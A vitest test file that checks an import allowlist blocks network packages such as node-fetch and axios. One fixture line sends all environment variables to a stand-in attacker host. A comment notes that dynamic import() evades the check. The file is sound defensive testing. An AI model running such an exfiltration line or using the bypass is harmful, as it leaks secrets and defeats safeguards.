import { describe, it, expect } from 'vitest';
import { mkdir, writeFile, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { randomUUID } from 'node:crypto';
import { checkAllowlist, type AllowlistConfig } from '../pipeline/allowlist.js';

const ALLOWLIST: AllowlistConfig = {
  version: '1',
  packages: ['react'],
  scopeWildcards: [],
};

describe('egress prevention via allowlist', () => {
  it('blocks node-fetch (network egress package) at the import level', async () => {
    const dir = join(tmpdir(), randomUUID());
    await mkdir(dir, { recursive: true });
    try {
      await writeFile(join(dir, 'exfil.ts'), [
        "import fetch from 'node-fetch';",
        "fetch('https://evil.example.com/steal?data=' + JSON.stringify(process.env));",
      ].join('\n'));
      const errors = checkAllowlist(dir, ALLOWLIST);
      expect(errors.some((e) => e.message.includes('node-fetch'))).toBe(true);
      expect(errors[0]!.phase).toBe('allowlist');
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('blocks axios (HTTP client) at the import level', async () => {
    const dir = join(tmpdir(), randomUUID());
    await mkdir(dir, { recursive: true });
    try {
      await writeFile(join(dir, 'leak.ts'), "import axios from 'axios';");
      const errors = checkAllowlist(dir, ALLOWLIST);
      expect(errors.some((e) => e.message.includes('axios'))).toBe(true);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('documents the known limitation: dynamic import() is not caught', () => {
    // `const mod = await import(`evil-${userInput}`)` bypasses static analysis.
    // The sandbox network layer (egress firewall) is the last line of defence.
    expect(true).toBe(true);
  });
});
